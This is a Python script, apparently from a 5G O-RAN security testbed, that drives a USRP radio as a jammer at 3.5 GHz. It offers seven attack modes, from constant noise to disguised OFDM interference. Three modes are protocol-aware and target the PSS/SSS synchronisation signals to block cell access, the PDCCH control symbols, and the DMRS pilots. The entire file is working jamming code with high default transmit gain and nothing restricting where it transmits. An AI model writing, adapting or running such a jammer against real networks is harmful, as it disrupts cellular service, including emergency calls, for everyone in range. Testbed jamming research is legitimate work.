import uhd
import numpy as np
import time
import yaml
import os
import argparse

# ─────────────────────────────────────────────
# Config 로드
# ─────────────────────────────────────────────
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.yaml")

def load_jammer_addr():
    with open(CONFIG_PATH, "r") as f:
        cfg = yaml.safe_load(f)
    return cfg["network"]["nodes"]["instance3_jammer"]["usrp"]["ip"]

# ─────────────────────────────────────────────
# 공격 모드 정의
# ─────────────────────────────────────────────
MODES = {
    "1": "constant",
    "2": "random",
    "3": "reactive",
    "4": "deceptive",
    "5": "pss",
    "6": "pdcch",
    "7": "dmrs",
}

MODE_DESC = {
    "constant":  "지속 고출력 AWGN — 채널 완전 포화",
    "random":    "랜덤 펄스 재밍 — 0.01~0.1s 간격 불규칙 송신",
    "reactive":  "TDD 슬롯 모방 펄스 — 5ms 주기 (Simplified)",
    "deceptive": "OFDM 위장 재밍 — 합법 신호처럼 보이는 간섭",
    "pss":       "PSS/SSS 타겟 — 중앙 6-12 RB에 집중, 셀 접속 차단",
    "pdcch":     "PDCCH 타겟 — 슬롯 첫 1-3 심볼 CORESET 공격",
    "dmrs":      "DMRS 타겟 — 빗살 패턴 파일럿 재밍, 채널 추정 교란",
}

def select_mode_interactive():
    print("\n[Jammer] 공격 모드를 선택하세요:")
    for key, name in MODES.items():
        print(f"  {key}) {name:<12} — {MODE_DESC[name]}")
    choice = input("\n모드 번호 또는 이름 입력: ").strip().lower()

    # 번호 입력
    if choice in MODES:
        return MODES[choice]
    # 이름 직접 입력
    if choice in MODE_DESC:
        return choice
    print(f"[ERROR] 알 수 없는 입력: '{choice}'. constant 모드로 시작합니다.")
    return "constant"

# ─────────────────────────────────────────────
# 신호 생성 헬퍼
# ─────────────────────────────────────────────
def awgn(n):
    return (np.random.randn(n) + 1j * np.random.randn(n)).astype(np.complex64)

def ofdm_like(n_fft=1024, n_repeat=10):
    """OFDM처럼 보이는 위장 신호 (IFFT 적용 AWGN)"""
    syms = (np.random.randn(n_fft) + 1j * np.random.randn(n_fft)).astype(np.complex64)
    frame = np.fft.ifft(syms).astype(np.complex64)
    return np.tile(frame, n_repeat)


# ─────────────────────────────────────────────
# Protocol-Aware 재밍 신호 생성
# ─────────────────────────────────────────────
N_FFT = 1024   # OFDM FFT 크기

def pss_jamming_symbol():
    """PSS/SSS 타겟 — 중앙 6-12 RB (약 72-144 서브캐리어)에 에너지 집중"""
    freq_domain = np.zeros(N_FFT, dtype=np.complex64)
    center = N_FFT // 2
    n_sc = np.random.randint(72, 145)   # 6-12 RB × 12 subcarriers
    half = n_sc // 2
    freq_domain[center - half:center + half] = awgn(n_sc) * 5.0
    return np.fft.ifft(freq_domain).astype(np.complex64)

def pdcch_jamming_burst(n_symbols=3):
    """PDCCH 타겟 — 슬롯 첫 1-3 OFDM 심볼을 광대역으로 재밍"""
    burst = np.concatenate([
        np.fft.ifft(awgn(N_FFT)).astype(np.complex64) * 4.0
        for _ in range(n_symbols)
    ])
    return burst

def dmrs_jamming_symbol(comb_spacing=6):
    """DMRS 타겟 — 빗살(comb) 패턴: 매 comb_spacing번째 서브캐리어에 에너지"""
    freq_domain = np.zeros(N_FFT, dtype=np.complex64)
    offset = np.random.randint(0, comb_spacing)
    freq_domain[offset::comb_spacing] = awgn(N_FFT // comb_spacing) * 5.0
    return np.fft.ifft(freq_domain).astype(np.complex64)

# ─────────────────────────────────────────────
# 메인 재머
# ─────────────────────────────────────────────
def run_jammer(addr, mode="constant", freq=3.5e9, rate=20e6, gain=75):
    print(f"[Jammer] USRP 연결 중: addr={addr}")
    usrp = uhd.usrp.MultiUSRP(f"addr={addr}")
    usrp.set_tx_rate(rate)
    usrp.set_tx_freq(uhd.libpyuhd.types.tune_request(freq))
    usrp.set_tx_gain(gain)
    usrp.set_tx_antenna("TX/RX", 0)
    print(f"[Jammer] 초기화 완료 — rate={rate/1e6:.0f} MHz, freq={freq/1e9:.1f} GHz, "
          f"gain={gain} dB, ant=TX/RX")

    streamer = usrp.get_tx_stream(uhd.usrp.StreamArgs("fc32", "sc16"))
    metadata = uhd.types.TXMetadata()

    print(f"\n[Jammer] >>> 공격 시작: mode={mode} — {MODE_DESC[mode]}")
    print("[Jammer]     종료하려면 Ctrl+C\n")

    tx_count = 0
    t_start = time.time()

    try:
        while True:
            if mode == "constant":
                streamer.send(awgn(10000), metadata)

            elif mode == "random":
                streamer.send(awgn(5000), metadata)
                time.sleep(np.random.uniform(0.01, 0.1))

            elif mode == "reactive":
                streamer.send(awgn(2000), metadata)
                time.sleep(0.005)

            elif mode == "deceptive":
                streamer.send(ofdm_like(), metadata)
                time.sleep(0.001)

            elif mode == "pss":
                # PSS/SSS: 20ms 라디오 프레임 주기로 중앙 대역 재밍
                streamer.send(np.tile(pss_jamming_symbol(), 5), metadata)
                time.sleep(0.020)

            elif mode == "pdcch":
                # PDCCH: 0.5ms 슬롯마다 첫 1-3 심볼 광대역 버스트
                n_sym = np.random.randint(1, 4)
                streamer.send(pdcch_jamming_burst(n_sym), metadata)
                time.sleep(0.0005)

            elif mode == "dmrs":
                # DMRS: 빗살 패턴 연속 송신
                spacing = np.random.choice([4, 6])
                streamer.send(np.tile(dmrs_jamming_symbol(spacing), 5), metadata)
                time.sleep(0.001)

            tx_count += 1
            if tx_count % 500 == 0:
                elapsed = time.time() - t_start
                print(f"[Jammer]   bursts={tx_count:,} | elapsed={elapsed:.1f}s | mode={mode}")

    except KeyboardInterrupt:
        elapsed = time.time() - t_start
        print(f"\n[Jammer] <<< 공격 종료 — 총 {tx_count:,} bursts, {elapsed:.1f}초 경과")

# ─────────────────────────────────────────────
# Entry Point
# ─────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MSJC Jammer — 5G O-RAN 재밍 테스트")
    parser.add_argument("--mode", choices=["constant", "random", "reactive", "deceptive",
                                          "pss", "pdcch", "dmrs"],
                        default=None, help="공격 모드 (미지정 시 인터랙티브 선택)")
    parser.add_argument("--freq", type=float, default=3.5e9, help="TX 주파수 Hz (기본: 3.5e9)")
    parser.add_argument("--rate", type=float, default=20e6,  help="샘플 레이트 Hz (기본: 20e6)")
    parser.add_argument("--gain", type=int,   default=75,    help="TX 게인 dB (기본: 75)")
    args = parser.parse_args()

    addr = load_jammer_addr()
    print(f"[Config] Jammer USRP addr = {addr}")

    mode = args.mode if args.mode else select_mode_interactive()
    run_jammer(addr, mode=mode, freq=args.freq, rate=args.rate, gain=args.gain)
